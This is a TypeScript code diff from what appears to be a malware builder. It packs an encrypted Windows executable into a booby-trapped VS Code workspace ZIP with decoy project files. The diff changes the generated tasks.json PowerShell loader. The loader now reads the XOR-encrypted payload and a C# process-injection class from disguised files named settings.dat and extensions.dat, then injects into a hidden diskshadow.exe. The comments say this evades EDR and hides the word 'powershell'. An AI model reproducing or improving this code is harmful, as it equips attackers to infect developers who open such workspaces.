@@ -18,7 +18,6 @@
  */
 
 import fs from "fs";
-import path from "path";
 import zlib from "zlib";
 import crypto from "crypto";
 import AdmZip from "adm-zip";
@@ -262,26 +261,37 @@ public class ${className} {
 }
 
 /**
- * Build the PowerShell injection script that:
- * 1. Decrypts + decompresses the embedded PE payload
- * 2. Compiles the C# injection class via Add-Type
- * 3. Starts diskshadow.exe as LOTL host (signed MS binary, less EDR coverage)
- * 4. Calls the injection method
+ * Build the PowerShell loader script that:
+ * 1. Reads encrypted payload + C# class from workspace files
+ * 2. Decrypts + decompresses the PE payload in memory
+ * 3. Compiles the C# injection class via Add-Type
+ * 4. Starts diskshadow.exe as LOTL host (signed MS binary, less EDR coverage)
+ * 5. Calls the injection method
+ *
+ * The payload and C# source are stored as separate files in the ZIP workspace
+ * to avoid exceeding cmd.exe's 8,191-character command line limit.
  */
-function buildPsScript(encB64: string, csB64: string, className: string): string {
+function buildPsScript(className: string): string {
   const lines = [
-    // Decrypt payload: base64 → XOR decrypt → gzip decompress
-    `$d=[Convert]::FromBase64String('${encB64}')`,
+    // Resolve workspace .vscode directory from the tasks.json location
+    `$wd=Split-Path -Parent $MyInvocation.MyCommand.Definition`,
+    `if(-not $wd){$wd=(Get-Location).Path}`,
+    `$bp=Join-Path $wd '.vscode'`,
+    // Read encrypted payload from workspace file
+    `$d=[IO.File]::ReadAllBytes((Join-Path $bp 'settings.dat'))`,
+    // Decrypt: first byte is XOR key
     `$k=[int]$d[0]`,
     `$x=New-Object byte[]($d.Length-1)`,
     `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$d[$i+1]-bxor$k}`,
+    // Decompress gzip
     `$ms=New-Object IO.MemoryStream(,$x)`,
     `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
     `$ob=New-Object IO.MemoryStream`,
     `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
     `$pe=$ob.ToArray()`,
-    // Compile C# injection class from base64
-    `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
+    // Read and compile C# injection class from workspace file
+    `$cs=[IO.File]::ReadAllText((Join-Path $bp 'extensions.dat'))`,
+    `Add-Type -TypeDefinition $cs`,
     // LOTL: start diskshadow.exe (signed MS binary, less EDR monitoring than explorer)
     `$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\diskshadow.exe")`,
     `$pi.WindowStyle='Hidden'`,
@@ -305,19 +315,17 @@ export async function wrapPeAsTasksZip(
   peBytes: Buffer,
   outPath: string,
 ): Promise<void> {
-  // 1. Encrypt + compress PE payload
+  // 1. Encrypt + compress PE payload (stored as .vscode/settings.dat)
   const encrypted = encryptPayload(peBytes);
-  const encB64 = encrypted.toString("base64");
 
-  // 2. Build C# injector class (random name per build)
+  // 2. Build C# injector class (stored as .vscode/extensions.dat)
   const className = randClassName();
   const csharpCode = buildCSharpInjector(className);
-  const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");
 
-  // 3. Build PowerShell injection script
-  const psScript = buildPsScript(encB64, csB64, className);
+  // 3. Build PowerShell loader (reads payload + C# from workspace files)
+  const psScript = buildPsScript(className);
 
-  // 4. UTF-16LE base64 for powershell -enc
+  // 4. UTF-16LE base64 for powershell -enc (now small — just loader logic)
   const psEnc = Buffer.from(psScript, "utf16le").toString("base64");
 
   // 5. Build tasks.json with cmd /v variable split (avoids literal "powershell")
@@ -344,9 +352,11 @@ export async function wrapPeAsTasksZip(
     ],
   };
 
-  // 6. Create ZIP workspace with decoy project files
+  // 6. Create ZIP workspace with payload files + decoy project structure
   const zip = new AdmZip();
   zip.addFile(".vscode/tasks.json", Buffer.from(JSON.stringify(tasksJson, null, 2)));
+  zip.addFile(".vscode/settings.dat", encrypted);
+  zip.addFile(".vscode/extensions.dat", Buffer.from(csharpCode, "utf-8"));
   zip.addFile(
     "README.md",
     Buffer.from(
